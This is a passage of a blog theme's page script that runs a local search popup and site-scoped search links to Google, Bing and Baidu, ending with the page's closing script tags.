      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', '请输入字符');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>